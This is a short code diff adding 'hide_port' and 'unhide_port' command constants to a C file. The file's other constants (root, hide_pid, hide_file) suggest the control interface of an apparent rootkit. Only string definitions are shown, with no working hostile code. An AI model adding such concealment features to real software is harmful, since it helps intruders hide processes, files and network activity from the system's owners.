@@ -21,6 +21,8 @@
 #define CFG_ROOT "root"
 #define CFG_HIDE_PID "hide_pid"
 #define CFG_UNHIDE_PID "unhide_pid"
+#define CFG_HIDE_PORT "hide_port"
+#define CFG_UNHIDE_PORT "unhide_port"
 #define CFG_HIDE_FILE "hide_file"
 #define CFG_UNHIDE_FILE "unhide_file"
 #define CFG_HIDE "hide"
